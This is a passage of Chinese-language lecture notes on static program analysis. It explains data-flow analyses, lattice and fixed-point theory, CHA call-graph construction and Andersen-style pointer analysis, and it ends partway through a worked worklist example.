Truth：理论上的既sound又complete的概念。它代表着所有的程序的特点。假如说程序存在10个空指针应用的异常，那么truth的定义就是10，但是莱斯定理表明，并不存在这样的一个方法可以把这所有的10个异常都检查出来。Truth其实就是那个理论上的最优结果。 Sound：对程序进行过拟合，over-approximate，不会漏报，但是会有误报false positives Complete：对程序进行欠拟合，under-approximate，不会误报，但是会有漏报false negatives 妥协soundness，相当于sound圈变小了，会造成漏报false negatives； 妥协completeness，相当于complete圈变大了，会造成误报false positives； 几乎所有的静态分析都会妥协completeness，宁愿误报也不要漏报！ 很多重要领域如军工、航天领域，我们追求的是soundness，但是要平衡精度和速度。那么我们绝大多数软件分析方法都做到了completeness，那么只要能证明满足soundness，那么该分析方法就是正确的。 02编译器与静态分析的关系 源码 Scanner-词法分析LexicalAnalysis-正则表达式RegularExpression 这一环中，判断每一个单词是否是合理的，合理的话就转换为Tokens，给下一步继续分析。 Parser-语法分析SyntaxAnalysis-上下文无关文法Context-Free Grammar 这一环中，语法分析主要是判断语法是否合理，类似符合英语的“主谓宾”结构。 这里用到一套形式化的结构就是上下文无关文法。 生成语法树。 为什么不用上下文敏感的语法来参与分析？ 答：就目前编程语言来说，上下文无关文法已经足够了。 ​ 如果用上下文关联的语法，杀鸡用40米的牛刀，它更适合分析人讲的自然语言。 ​ 弱表达能力的使用起来速度更快，效率更高。 Type Checker-语义检测Semantic Analysis-Attribute Grammar 根据上一步生成的AST抽象语法树，编译器会进行一点特别简单的语义检查，例如Type-Checking类型检查。 简单判断变量类型，例如float不能赋值给int。 生成圣诞树。Decorated AST Translator-生成中间表示代码IR-进行静态分析，优化 IR普遍是三地址码，进行优化，安全检查。 最后生成machine code机器码。 IR称为编译器前端，对于检查安全漏洞来说，必须要先把前端的检查都通过了，再去挑错，否则如果连基本的程序编译都无法通过，那么继续调漏洞也将毫无意义。 AST vs. IRAST ：高级，更接近于语法结构，依赖于语言种类，适用于快速类型检查，缺少控制流信息。 IR：低级，更接近于机器码，不依赖语言种类，压缩且简洁，包含控制流信息。是静态分析的基础。 3AC-3地址码 sootsoot用得是typed 3AC 是在3AC内部存在类型的形式 Jimple：typed 3-address code 12345678910111213// java IR（Jimple）基本知识invokespecial：call constructor, call superclass methods, call private methodsinvokevirtual: instance methods call (virtual dispatch) 派生invokeinterface: cannot optimization, checking interface implementationinvokestatic:call static methodsJava 7: invokedynamic -&gt; Java static typing, dynamic language runs on JVMmethod signature: class name, return type, method name(parameter1_type, parameter2_type) clinit是类的初始化复制 Class A&#123; B b = ...//会调用B的clinit方法，给类属性复制 BasicBlock BB 基本块定义：只有唯一1个开头入口和唯一1个结尾出口的最长3-地址指令序列。 识别基本块的算法： 首先确定入口指令，第一条指令是入口； 任何跳转指令的目标地址是入口； 任何跟在跳转指令之后的指令是入口。 然后构造基本块，任何基本块包含1个入口指令和其接下来的指令。 CFG Control Flow Graph控制流边： 基本块A的结尾有跳转指令跳转到基本块B； 原始指令序列中，B紧跟着A，且A的结尾不是无条件跳转。 03Data Flow Analysis总结： 数学符号形式化表示； 数据流分析其实就是在CFG上分析。 绝大部分静态分析都是牺牲了completeness，去追求soundness。放弃了速度，去追求精度。 首先对数据进行抽象，形式化表达； 接下来对程序进行over-approximation，==过拟合==，也就是说程序在运行中所有可能产生的值，都要在静态分析时候去考虑到。 May-Analysis：输出信息可能是正确的，相当于已经做了over-approximation过拟合； Must-Analysis：输出信息必须是正确的，准确的，相当于已经做了under-approxiamtion欠拟合； May-Analysis：绝大部分静态分析都是may，会有误报，这是必然 Must-Analysis：会有漏报 一般来说： May都是union，初始化都是空，bottom Must都是intersection。初始化是all，top（top就是程序分析中最不准的结果） 三要素：Nodes (BBs/statements)、Edges (control flows)、CFG (a program) 不同的数据流分析 有 不同的数据抽象表达 和 不同的安全近似策略，如 不同的 转换规则 和 控制流处理。 数据流分析预备知识输入/输出状态：程序执行前/执行后的状态（本质就是抽象表达的数据的状态，如变量的状态）。 数据流分析的结果：最终得到，每一个程序点对应一个数据流值(data-flow value)，表示该点所有可能程序状态的一个抽象。例如，我只关心x、y的值，我就用抽象来表示x、y所有可能的值的集合（输入/输出的值域/约束），就代表了该程序点的程序状态。 Transfer Funtion： 转换函数，约束规则。 12Forward Analysis前向分析：按程序执行顺序的分析。OUT[s]=fs(IN[s])，s-statementBackward Analysis反向分析：逆向分析。IN[s]=fs(OUT[s]) Reaching Definitions AnalysisForward &amp; MAY 问题定义：在p点给变量v一个定义d（赋值），存在一条路径使得程序点p能够到达q，且在这个过程中v不能被重新赋值。 May：不放过任何一条path，需要over来保证safe 应用举例：检测未定义的变量，若v可达p且v没有被定义，则为未定义的变量。 抽象表示：设程序有n条赋值语句，用n位向量来表示能reach与不能reach。 分析Transfer Function：OUT[B] = genB U (IN[B] - killB) 解释：基本块B的输出 = B内的所有变量v的定义（赋值/修改）语句 U （基本块B的输入-程序中其它所有定义v的地方）。本质就是本块与前驱修改变量的语句 作用之和（去掉前驱中已经定义的语句）。 简单例子： 以第一个基本块为例，gen就是d1,d2,d3三个定义语句，kill需要杀掉的就是在d1,d2,d3中定义的变量(i,j,a)在别处也被定义的语句，图里就是d4、d5、d6、d7，他们四个都需要被kill掉。 Control Flow：IN[B] = UNIONp a_predecesso_of_B Out[P] ——怎么理解，就是基于控制流而得到。 解释：基本块B的输入 = 块B所有前驱块P的输出的并集。注意，所有前驱块意味着只要有一条路径能够到达块B，就是它的前驱，包括条件跳转与无条件跳转，所以需要搞并集union。 算法目的：输入CFG，计算好每个基本块的killB（程序中其它块中定义了变量v的语句）和genB（块B内的所有变量v的定义语句），输出每个基本块的IN[B]和OUT[B]。 方法：首先所有基本块的OUT[B]初始化为空。遍历每一个基本块B，按以上两个公式计算块B的IN[B]和OUT[B]，只要这次遍历时有某个块的OUT[B]发生变化，则重新遍历一次（因为程序中有循环存在，只要某块的OUT[B]变了，就意味着后继块的IN[B]变了）。 例子抽象表示：设程序有n条赋值语句，用n位向量来表示能reach与不能reach。 说明：红色-第1次遍历；蓝色-第2次遍历；绿色-第3次遍历。针对等号左边的变量，先kill，再gen。 结果：3次遍历之后，每个基本块的OUT[B]都不再变化。 现在，我们可以回想一下，数据流分析的目标是，最后得到了，每个程序点关联一个数据流值（该点所有可能的程序状态的一个抽象表示，也就是这个n位向量）。在这个过程中，对每个基本块，不断利用基于转换规则的语义（也就是transfer functions，构成基本块的语句集）-OUT[B]、控制流的约束-IN[B]，最终得到一个稳定的安全的近似约束集。 停止条件OUT[B] = genB U (IN[B] - killB) 理解：genB和 killB是不变的，只有IN[B]在变化，所以说OUT[B]只会增加不会减少，程序的定义语句是有限的，所以最终肯定会停止。in决定out，out又决定in。 看下面这张图： 每一次迭代，IN都会加入更多的程序facts，这些facts要么被kill掉、要么成为surviors进入到OUT中。 不论是gen还是surviors，留在OUT中就会一直stay，也就是OUT永远不会缩减。 程序定义点也是有限的，就会导致OUT最终不会变化，算法一定会停止。 04Live Variables AnalysisBackward &amp; May 问题定义：某程序点p处的变量v，从p开始到exit块的CFG中是否有某条路径用到了v，如果用到了v，则v在p点为live，否则为dead。其中有一个隐含条件，在点p和引用点之间不能重定义v。 应用场景：可用于寄存器分配，如果寄存器满了，就需要替换掉不会被用到的变量。 抽象表示：程序中的n个变量用长度为n bit的向量来表示，对应bit为1，则该变量为live，反之为0则为dead。 分析Control Flow：OUT[B] = US a_successor_of_BIN[S] 理解：逆向分析，只要有一条path是live，父节点就是live。 Transfer Function：IN[B] = useB U (OUT[B] - defB) 理解：IN[B] = 本块中use出现在define之前的变量 U （OUT[B]出口的live情况 - 本块中出现了define的变量）。define指的是定义/赋值。 IN[B] = useB U (OUT[B] - defB) IN[B] 其实想看的是哪些变量在进入B之前就已经是live的，那么分为以下两种情况： 第一种是在B中从定义之前就被引用的，useB。 第二种是针对outB来说，逆向分析，如果想知道哪些在进入B之前就是live的，那么就需要从outB中减去那些在B中被重定义的那些，它们就是defB。 两种情况取并集，先killB，再useB。 kill等号左边的local，gen右边的locals。 特例分析：如以下图所示，第4种情况，v=v-1，实际上use出现在define之前，v是使用的。 算法初始化规律：一般情况下，may analysis 全部初始化为空，must analysis全部初始化为all。 目的：输入CFG，计算好每个基本块中的defB（重定义）和useB（出现在重定义之前的使用）。输出每个基本块的IN[B]和OUT[B]。 方法：首先初始化每个基本块的IN[B]为空集。遍历每一个基本块B，按以上两个公式计算块B的OUT[B]和IN[B]，只要这次遍历时有某个块的IN[B]发生变化，则重新遍历一次（因为有循环，只要某块的IN[B]变了，就意味前驱块的OUT[B]变了）。 问题：遍历基本块的顺序有要求吗？ 没有要求，但是会影响遍历的次数。 例子抽象表示：程序中的n个变量用长度为n bit的向量来表示，对应bit为1，则该变量为live，反之为0则为dead。 说明：从下往上遍历基本块，黑色-初始化；红色-第1次；蓝色-第2次；绿色-第3次。先kill左边的def，再gen右边的use。 结果：3次遍历后，IN[B]不再变化，遍历结束。 Available Expression AnalysisForward &amp; MUST 问题定义： 程序点p处的表达式x op y可用需满足2个条件： 从entry到p点的所有路径都必须经过x op y 在最后一次使用x op y之后，没有重定义操作数x、y。（如果重定义了x 或 y，如x = a op2 b，则原来的表达式x op y中的x或y就会被替代）。 应用场景：用于优化，检测全局公共子表达式。 抽象表示：程序中的n个表达式，用长度为n bit的向量来表示，1表示可用，0表示不可用。 分析Transfer Function：OUT[B] = genB U (IN[B] - killB) 理解： genB：基本块B中所有新的表达式（并且在这个表达式之后，不能对表达式中出现的变量进行重定义）–&gt;加入到OUT；killB：从IN中删除和被重新定义变量有关的表达式。 Control Flow： 理解：从entry到p点的所有路径都必须经过该表达式。 问题：该分析为什么属于must analysis呢？因为我们允许有漏报，不能有误报，比如以上示例中，改为x=3，去掉 b=e16*x，该公式会把该表达式识别为不可用。但事实是可用的，因为把x=3替换到表达式中并不影响该表达式的形式。这里虽然漏报了，但是不影响程序分析结果的正确性。 算法目的：输入CFG，提前计算好genB和killB。 方法：首先将OUT[entry]初始化为空，所有基本块的OUT[B]初始化为1…1。遍历每一个基本块B，按以上两个公式计算块B的IN[B]和OUT[B]，只要这次遍历时有某个块的OUT[B]发生变化，则重新遍历一次（因为有循环，只要某块的OUT[B]变了，就意味后继块的IN[B]变了）。 例子抽象表示：程序中的n个表达式，用长度为n bit的向量来表示，1表示可用，0表示不可用。 说明：黑色-初始化；红色-第1次；蓝色-第2次。先kill再gen。kill看等式左边的local，gen看等式右边的expr。 结果：2次遍历后，OUT[B]不再变化，遍历结束。 三种分析方法对比 问题：怎样判断是May还是Must？ Reaching Definitions表示只要从赋值语句到点p存在1条路径，则为reaching，结果不一定正确； Live Variables表示只要从点p到Exit存在1条路径使用了变量v，则为live，结果不一定正确； Available Expressions表示从Entry到点p的每一条路径都经过了该表达式，则为available，结果肯定正确。 05 &amp; 06迭代算法实质分析理论本质：常见的数据流迭代算法，目的是通过迭代计算，最终得到一个稳定的不变的解。 图示 不动点：当Xi = F(Xi)时，就是不动点。 问题： 迭代算法是否一定会停止（到达不动点）？ 迭代算法如果会终止，会得到几个解（几个不动点）？ 迭代几次会得到解（到达不动点）？ 偏序 Partial Order 上下界 Upper and Lower Bounds定义 理解： S是P的子集， 如果S中所有元素x，都有x≤u，那么就称u是子集S的上界。u属于P，但是u并不一定在S中。 如果S中所有元素x，都有i≤x，那么就称i是子集S的下界。i属于P。 最小上界：lub，上界里最小的那个； 最大下界：glb，下界里最大的那个； 实例 特性并非每个偏序集都有上下确界。 如果存在上下确界，则是唯一的。unique 利用传递性和反证法即可证明。 Lattice 格论格 理解： 任意两个元素构成的集合都存在最大下界和最小上界，那么这个偏序集就是格。 join union 最小上界 meet intersection 最大下界 半格 全格 理解： finite -&gt; complete 但是complete不能保证是finite的 全格，任意子集都有最大上界和最小下界。 格点积 数据流分析框架 via.Lattice 单调性与不动点定理（Monotonicity&amp;Fixed Point Theorem） 证明： 理解： 迭代算法转换到不动点理论 说点自己的理解： 单调性： transfer function ： gen &amp; kill 保证了never shrinks 所以是单调的 join&amp;meet : 第三个问题： 算法何时能够达到不动点？ Lattice高度：是lattice上从top到bottom之间最长的路径。 最差的迭代次数： h x k 迭代次数最差情况： 每个BB的OUT/IN值只变化一个（0-&gt;1） 最坏的情况就是lattice上每次只走一步，每一步只改一个bit位置 图中lattice的高度是h ( h = 3 )，一共k个node，每一轮都需要走h步，每个node只改一个，那么当然就需要h x k次 从Lattice角度看may/must分析根据如下的图，逐步讲解整个过程： 需要记住的前提： 不论是may-analysis和must-analysis都是从不安全（unsafe result）到安全（safe result） 并且，may-analysis和must-analysis都是从准确（precise）到不准确（un-precise） 注意：现在是在对may/must analysis的算法整体流程分析，从lattice的角度。但是本身该算法是safe的——这是由safe-approximate来保证的，而不是通过lattice或者其他保证的。 May analysis 从bottom开始，bottom代表的是所有定义都是可达的——这就是不安全的结果（因为验证本质上是一个查错的工具，现在的验证结果是没有任何一个错误，这就是不可靠的） 图中的no definitions can reach这个是根据可达性定义的应用来考虑的。可达性定义会应用在变量是否初始化中，它会在entry给每个变量一个UNDEF(图里的definitions只是个形式化表达)，这里的意思就是指所有的UNDEF都无法到达，那么就意味着程序中会将每个变量都初始化——那么就是该程序无未初始化错误——分析的结果是不安全的 最上面到top，top代表的是所有定义都是不可达的——从查错角度来讲，这句话是安全的，因为所有定义都有可能存在错误，但是这句话没有用——程序未验证前，就可以说这句话了——所以是safe but useless 图中的all definition may reach就是指，可达性定义应用中的那些个UNDEF，都是可达的，那么所有变量都是未初始化的——所有变量都可能存在未初始化的错误——分析的结果是安全的，但是是个废话 中间的truth： 表明最准确的验证结果，假设{a,c}是truth，那么包括其以上的都是safe的，一下的都是unsafe，就是上图的阴影和非阴影。 并且都是从不安全到安全的过程——所以箭头从下向上 从bottom开始，得到的是最小不动点，就是离truth最近的，是最准确的。 向上还有多个不动点，但是准确度越来越不准（直到top就是最不准的）——bottom都是000000，top都是111111，may analysis得到的解是最小不动点，就是最优解，是最准的那一个。 ——所以，可达定义得到的是最准确的结果，虽然还是soundness的（过近似） Must analysis前向分析，从上往下，但还是从unsafe到safe。 must analysis以available表达式为例。 从top开始，代表所有表达式都是可用的——是最unsafe的——top是1111111 如果是利用在表达式计算优化中，那就是有很多已经被重新定义的表达式也被优化了（实际上不能被优化）——那么该优化就是错误的 到bottom，代表没有表达式是可用的——是安全的，但是是无用的 从top开始到bottom，就是unsafe到safe的转变，存在一个truth，代表程序真实的结果； 分析从top到bottom，达到的就是最大不动点，离truth最近，那么该最大不动点得到的解就是最优的——must analysis得到的解是最大不动点，就是最优解–为什么是最大不动点，tricky一下，最上面都是11111，最下面都是00000，是一个递减的过程，得到的第一个不动点当然是最大不动点 战术“多讲几句”： tranfer function和control flow 前者是写死的，control flow里面有join还是meet决定了很多 比如说000和001去join，是001，其实join就是获得了最小上界lub而不是一大步直接迈到111(111是上界 但不是lub)，每次也都是迈出了最小的一步，minimal step。 MOP &amp; DistributivityMOP: Meet-over-all-paths solution 将所有路径都join/meet的方法，通常用来衡量精度。 这里的meet是统称meet和join两种合并操作。 区别 理解： 这里其实都是在追求一种近似解，求解近似解的方法中最基本的一个就是对问题进行抽象。 引入两个近似方案： 忽略所有路径的条件判断，认为所有分支都是可达的。 MOP or Distribute Distribute：结合transfer function，也就是gen-kill问题。gen-kill这种数据流方程的做法其实是在汇聚点的位置提前做合并。 MOP：遍历所有可能的路径并且在路径的尾部进行数据流结果的合并。 Worklist算法是迭代算法的一种优化，更常用 本质：就是只将有变化的值挑出来，再去利用转换函数和控制流操作。 07Motivation过程内分析：Intra-procedual Analysis，未考虑函数调用，导致分析不精确。 过程间分析：Inter-procedural Analysis，考虑函数调用，又称为全程序分析（Whole Program Analysis），需要构建调用图call graph，加入Call edges和Return edges。 Call Graph 调用图调用图定义定义：本质是调用边的集合，从调用点（call-sites）到目标函数（target methods / callees）的边。 应用：是所有过程间分析（跨函数分析）的基础，程序优化，程序理解，程序调试。 面向对象语言OOL的调用图构造 Java代表性算法：从上往下精度变高，速度变慢，重点分析第1、4个算法。 Class hierarchy analysis(CHA) Rapid type analysis(RTA) Variable type analysis(VTA) Pointer analysis(k-CFA) Java调用分类： Static call Special call Virtual call 指令 invokestatic invokespecial invokeinterface、 invokevirtual Receiver objects × ✓ ✓ 目标函数 Static函数 构造函数、 私有函数、父类的实例函数 其他实例函数 目标函数个数 1 1 ≥1 (polymorphism多态性) 何时确定 编译时 编译时 运行时 理解： 一个virtual call 在程序运行的不同状态时，可能调用到不同的目标方法，具有多态性，运行时确定。 Virtual call 是 构造调用图的实际关键所在。 virtual call在程序运行时才能得到，基于2个要素得到： reciever object的具体类型：c 调用点的函数签名：m。（通过signature可以唯一确定一个函数）Soot采取的格式 signature = 函数所在的类 + 函数名 + 描述符 描述符 = 返回类型 + 参数类型 简记为C.foo(P, Q, R) Method Dispatch（Virtual call）定义：用Dispatch(c, m)来模拟动态Method Dispatch过程，c表示reciever object，m表示函数签名。 解释：若该类的非抽象方法（实际可执行的函数主体）中包含和m相同名字、传递/返回参数的m‘，则直接返回；否则到c的父类中找。 示例： 理解： Dispatch（B,A.foo()）先对B类自己进行，但是B没有foo方法，向上找父类A才有。 Dispatch（C,A.foo()）C自己本身就有，那么就是C自己的方法。 Class Hierarchy Analysis CHA 类层次分析目的：根据每个virtual call 的 receiver varible 的声明类型来求解所有可能调用的目标函数。如 A a = ... ; a.foo(); 这个a就是receiver object，声明类型就是A。 CHA假定a可以指向A以及 A所有子类对象，CHA的过程就是从A和子类中去找目标函数。 算法：Resolve(cs)——利用CHA算法找到调用点所有可能的调用目标。 示例： 算法应用： 理解： 第三个b.foo（） 算法里面说是对b和b的所有子类进行dispatch： b自己：没有 向上找父类 父类是A 那么就是A.foo() b所有子类：C和D 那么就是C.foo()和D.foo() 以上b.foo()的调用目标 C.foo()和D.foo()是错误，理论上是假的，因为已经指定了是B类型，所以b.foo()根本不会调用C、D的foo()。因为CHA只考虑声明类型，也就是B，导致准确度下降。多态性就是说，父类可以引用子类的对象，如B b=new C()。 优缺点：CHA优点是速度快，只考虑声明类型，忽略数据流和控制流；缺点是准确度低。 总结：本类中有同名函数就在本类和子类找，没有就从父类找，接着找父类的子类中的同名函数（CHA分析）。 利用CHA生成整个程序的调用图思想：遍历每个函数中的每个调用指令，调用CHA的Resolve()找到对应的目标函数和调用边，函数+调用边=调用图。 步骤： 从main方法开始，作为入口方法。 对于每个可达方法m，求Resolve（cs）。 不断重复，直到没有新的方法，全遍历。 算法： m_entry=程序的入口方法 示例： 理解： 首先WL集合就是待处理方法，一开始WL里面就是A.main()。 浅色块是call site，深色块是自己类中的方法。 首先把main方法取出来，Resolve解它，是静态方法，只有他自己，那么连上一条调用边，目标方法A.foo()加入到WL中。 接着处理A.foo()方法，它里面有一个new a.bar()，那么a.bar()的目标方法就是A，B，C三个bar方法，三条边，并且这三个方法都加入到worklist里面。 再取A.bar()，它的目标方法就是C.bar()，也要正常加入WL里面。 接着是B.bar()，那么就是啥也不做。 最后一个是C.bar()，同样调用A.foo()，加边。 跳过最后的C.foo，A.foo。 过程间控制流分析图 Interprocedural Control-Flow Graph ICFG定义：过程间控制流图ICFG = 各个方法自己的CFG + (Call edges + Return edges)。 Call edges：连接调用点和目标函数入口 Return edges：从return语句连到Return site（Call site后面一条语句） 说明：对ICFG进行数据流分析，目前没有标准的一套算法。 对比： Intraprocedural Interprocecdural 程序表示 CFG ICFG = CFGs + call &amp; return edges 转换规则 Node transfer Node transfer + edge transfer 常量传播数据流分析： Node transfer：与过程内分析相同，对每个调用点，将等号左边kill掉。 Call edge transfer：传参 Return edge transfer：传返回值 常量传播示例： 理解： 首先也是从main方法开始，黄色代表in-flow，蓝色代表out-flow。 call的时候kill掉左手边变量，直接flow过去，就算有值也是return过来的。 说明：黄色背景边必须有，从b = addOne(a)到c=b-3，a通过此边传递，b通过addOne()传递。若a也通过addOne()传递，会额外消耗系统资源。 在倒数第二个 1b = ten(); 需要把b在flowset中kill掉，因为b的值会在返回值里面被改掉 08 &amp; 09终于来到了指针分析 指针分析必要性： 指针分析目标：分析程序指针可以指向哪些内存区域。对于Java等面向对象语言，主要分析指针指向哪个对象。 说明：指针分析属于may analysis，分析的结果是某指针所有可能指向哪些对象Object，是个over-approximation集合。 示例：面向对象语言中的指针指向问题。对于setB()函数，this指向new A()，因为是调用者是a.setB()；setB()中的b是x传过来的，所以b指向new B()，A.b指向 new B()。 区别： 指针分析：分析指针所有可能指向的对象。 别名分析：分析两个指针是否指向相同的对象，可通过指针分析来推导得到。如果指向同一个对象，那么就是别名关系。 应用：基本信息（别名分析/调用图），编译优化（嵌入虚拟调用），漏洞（空指针），安全分析（信息流）。 指针分析影响因素指标：精度（precision）&amp; 效率（efficiency）。 影响因素：本课程，我们主要分析分配点的堆抽象技术、上下文敏感/不敏感、流不敏感、全程序分析。 因素 问题 选项 Heap abstraction 如何建模堆内存？ • Allocation-site • Storeless Context sensitivity 如何建模调用上下文？ • Context-sensitive • Context-insensitive Flow sensitivity 如何建模控制流？ • Flow-sensitive • Flow-insensitive Analysis scope 分析哪部分程序？ • Whole-program • Demand-driven 写在前面指针分析中往往会遇到flow-sensitive、path-sensitive、context-sensitive flow-sensitive：关注语句的顺序。比如说在流敏感的指针分析中，一个非流敏感指针别名分析可能得出“变量x和y可能会指向同一位置”，而流敏感指针别名分析得出的结论类似于“在执行第20条指令后，变量x和y可能会指向同一位置” 。所以，一个非流敏感指针别名分析不考虑控制流，并认为所发现的别名在程序所有位置均成立。 path-sensitive：关注程序控制流的分支。路径敏感往往会导致“路径爆炸“(path explosion)，“无限搜索空间”(infinite search space) context-sensitive：*关注过程间分析，考虑函数调用的上下文关系。 * 堆抽象 Allocation Site（内存建模）问题：程序动态执行时，堆对象个数理论上是无穷无尽的，但静态分析无法处理这个问题。所以为保证指针分析可以终止，我们采用堆抽象技术，将无穷的具体对象抽象成有限的抽象对象。也就是，将有共性的对象抽象成1个静态对象，从而限制静态分析对象的个数。 我们只学习Allocation-Site技术，最常见也最常被使用。 Allocation-Site原理：将动态对象抽象成它们的创建点（Allocation-Site），来表示在该点创建的所有动态对象。Allocation-Site个数是有限的。 示例：循环创建了3个对象，我们用O2来抽象表示这3个动态对象。几个new就会合并处理几个。 上下文敏感Context Sensitivity问题：考虑是否区分不同call-site对同一函数的调用。 Context-sensitive：根据某函数调用上下文的不同，多次分析同一函数，更加准确。 Context-insensitive：将不同的上下文merge到一起，每个函数只分析一次。 流敏感 Flow Sensitivity 控制流建模问题：考虑语句顺序（控制流）的影响 vs 把程序当做无序语句的集合。 方法：流敏感会在每个程序点都保存一份指针指向关系映射表，而流不敏感则对整个程序只保存一份指向关系映射。 说明：目前流敏感对Java提升不大，不过在C中很有效，本课程分析的是Java，所以Java重点讨论流不敏感技术。 指针分析示例： 分析范围 Analysis Scope问题：分析程序的哪一部分？ Whole-program 全程序：分析全程序的指向关系。 Demand-driven 需求驱动：只分析影响特定域的指针的指向关系。会很耗费资源。 分析语句种类问题：哪些语句会影响指针指向，那就只分析这些语句。 Java指针类型： Lacal variable: x Static field:C.f （有时称为全局变量）——不分析 Instance field: x.f 对象的field 把他们的组合看成是一个pointer object Array element: array[i] ——不分析，因为静态分析无法确定下标，所以将array中所有成员映射到一个field中，等价于Instance field，所以不重复分析。如下图所示： 五个影响指针指向的语句： New: x = new T() Assign：x = y Store： x.f = y Load： y = x.f Call： r = x.k(a,…) Static call： C.foo() Special call： super.foo() / x.&lt;init&gt;() / this.privateFoo() Virtual call：x.foo() 重点分析 指针分析规则首先分析前4种语句：New / Assign / Store / Load。 指针分析的域和相应的记法：变量/函数/对象/实例域/指针，用pt表示程序中的指向关系（映射）。 理解： 指针Pointers，指的就是两部分： 程序内部所有变量V 实例对象的属性域O X F 这里面P(O)指的是对象的幂集； pt(p)表示p点的指针集。 这里可以把Points-to relations理解为Map就是映射，Key就是指针，Value就是指针指针集。 规则：采用推导形式，横线上面是条件，横线下面是结论。 New：创建对象，将new T()对应的对象oi加入到x的指针集。 Assign：将y的指针集加入到x对应的指针集。 Store：让oi的field指向oj。 Load：Store的反操作。 指针分析实现方式算法要求：全程序指针分析，要容易理解和实现。 本质：在指针（变量/域）之间传递指向信息。Andersen-style分析（很普遍）——很多solving system把指针分析看作是一种包含关系，eg，x = y，x包含y。 问题：当一个指针的指向集发生变化，必须更新与它相关的其他指针。如何表示这种传递关系？答案PFG。 PFG：用指针流图PFG来表示指针之间的关系，PFG是有向图。 Nodes：Pointer = V U (O x F) 节点n表示一个变量或抽象对象的域。 Edges：Pointer X Pointer 边x -&gt; y 表示指针x指向的对象may会流入指针y。 Edges添加规则：根据程序语句 + 对应的规则。 示例： 指针分析PTA方法： 构造PFG，PFG也受指向关系的影响。 根据PFG传播指向信息。 指针分析算法过程内PTA算法 符号： S：程序语句的集合。 WL：Work list，待合并的指针信息，二元组的集合，&lt;指针n，指向的对象集合pts&gt;，代表的是pts将被加入到n的指向集pt(n)中。 PFG：指针流图，边的集合。 addEdge做了什么呢？ 首先如果s-&gt;t这条边在PFG中不存在，那么加一条s-&gt;t的边，如果s自身指针集里面还有东西，那么需要向WL中添加&lt;t,pts&gt;，也就是说s自身指向的所有东西，现在都需要被t指向。 换句话说，pts流向了t Propagate做了什么呢？Propagate(n,delta) 首先 如果delta不为空，那么需要更新ptn，向ptn中增加delta 接下来，对于PFG中，n的后继们，delta需要加入到他们每一个人的指针集里面 理解： WL &lt;a,ptb&gt;表示是ptb需要加入到a指针集里面 是一种TODO AddEdge(s,t) 如果s-&gt;t在PFG中没有出现过，那么就添加到PFG之中 如果s的指针集非空，那么就向WL中添加&lt;t,pts&gt; 表示的是s指针集中的东西，也需要加入到t的指针集里面 Propagate(n,delta) 这里面delta表示变量n的增量 如果delta不为空 那么就union 加入到ptn之中 如果在PFG中 n还有后继 n-&gt;s这类 那么就向WL中新增一个entry&lt;s,delta&gt; 表示delta也要加入到n后续那些人的指针集里面 大循环 取出WL中的一个entry &lt;n,pts&gt; 计算delta 紧接着Propagate(n,delta) 接下来如果n是一个变量，如果存在x.f的store和load的话，addEdge分别加边 delta是怎么来的？ pts中可能已经有一些对象是ptn中已经存在的了，所以需要去重。 delta中真正存在的是新增的，需要后续一串连锁反应。 强化一下AddEdge算法： AddEdge(s，t)的意思就是如果PFG里面没有，那么就新增一条s-&gt;t的边， 接下来不要忘了指向信息的传播，如果s的指针集里面还有东西，那么也要把s指针集里面的东西让t也能指到。也就是新增&lt;t,pt(s)&gt;到WorkList集合里面。 123s = t ;指向：-----&gt;流向：&lt;----- 对于上面这个语句： s是指针，s指向了t，那么t属于pt(s)，pt(s)={t}; 也可以理解为pt(t)指针集里面的东西向左流给了pt(s)，这里如果pt(t)里有东西，那么也要向左流给s，也就是pt(s)={pt(t)}; Oi.f可能会被别的变量指向 强化理解一下Propagate算法：参数是n、pts，这里的pts其实就是delta增量。 如果pts不是空集，那么就是把增量加入到ptn。 接下来还要把新的指针集都改了，继续传播下去。连锁反应。 取出所有的n指向的边，也就是n的后继s，将&lt;s,pts&gt;加入到WL中，这里其实就是将指向信息传递给同名指针。 例子流不敏感指针分析 WL 正处理 PFG 指针集 处理语句 算法语句 1 [&lt;b, {o1}&gt;, &lt;c, {o3}&gt;] 1，3 处理New 2 [&lt;b, {o1}&gt;, &lt;c, {o3}&gt;] a &lt;- b；d &lt;- c； 2，4 处理Assign 3 [&lt;c, {o3}&gt;] &lt;b, {o1}&gt; a &lt;- b；d &lt;- c； pt(b)={o1} while开头 4 [&lt;c, {o3}&gt;], [&lt;a, {o1}&gt;] a &lt;- b；d &lt;- c； Propagate()传递，没有b.f语句 5 [&lt;a, {o1}&gt;] &lt;c, {o3}&gt; a &lt;- b；d &lt;- c； pt(c)={o3} while开头 6 [&lt;a, {o1}&gt;, &lt;d, {o3}&gt;] a &lt;- b；d &lt;- c； Propagate()传递，有c.f语句 7 [&lt;a, {o1}&gt;, &lt;d, {o3}&gt;] a &lt;- b；d &lt;- c；o3.f &lt;- a；o3.f &lt;- d； 4，6 处理Store/Load，添加边 8 [&lt;d, {o3}&gt;] &lt;a, {o1}&gt; pt(a)={o1}； while开头 9 [&lt;d, {o3}&gt;,&lt;o3.f, {o1}&gt;] Propagate()传递 10 [&lt;o3.f, {o1}&gt;] &lt;d, {o3}&gt; pt(d)={o3} while开头 11 [&lt;o3.f, {o1}&gt;, &lt;o3.f, {o3}&gt;] Propagate()传递，有d.f语句 12 [&lt;o3.f, {o1}&gt;, &lt;o3.f, {o3}&gt;] a&lt;-b；d&lt;-c；o3.f&lt;-a；o3.f&lt;-d；e&lt;-o3.f； 7 处理Load，添加边 13 [&lt;o3.f, {o3}&gt;] &lt;o3.f, {o1}&gt; pt(o3.f)={o1}； while开头 14 [&lt;o3.f, {o3}&gt;, &lt;e, {o1}&gt;] Propagate()传递 15 [&lt;e, {o1}&gt;] &lt;o3.f, {o3}&gt; pt(o3.f)={o1, o3} while开头 16 [&lt;e, {o1}&gt;, &lt;e, {o3}&gt;] Propagate()传递 17 &lt;e, {o1}&gt;；&lt;e, {o3}&gt; pt(e)={o1, o3} while开头 第一看new 语句，分别有1、3两处、直接添加到WL中 WL：&lt;b,o1&gt;,&lt;c,o3&gt; 第二看assign语句，分别有2、4两处。需要进入到addEdge函数语句 由于PFG此时还是空的，向PFG增加两条边 目前pta、ptb都是空的，所以不添加WL WL：&lt;b,o1&gt;,&lt;c,o3&gt; PFG: a&lt;-b , d&lt;-c 进入大循环，取出来&lt;b,o1&gt;，delta就是o1,进入Propagate函数 更新ptb为o1，b此时有后继a，需要增加&lt;a,o1&gt;到WL 由于没有b.f的操作，所以本次循环直接结束 WL：&lt;c,o3&gt;,&lt;a,o1&gt; PFG: 取出&lt;c,o3&gt;，delta就是o3，进入Propagate函数 